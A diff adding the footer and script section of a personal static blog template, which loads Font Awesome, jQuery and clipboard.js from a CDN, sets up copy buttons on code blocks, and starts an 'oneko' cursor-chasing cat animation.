+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    River
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <!-- Add Oneko.js Script -->
+    <script src="/js/oneko.js"></script>
+    <script>
+      window.onload = function() {
+        oneko('/images/oneko.gif'); // This starts the cat chasing the mouse
+      };
+    </script>
+</body>
+</html>
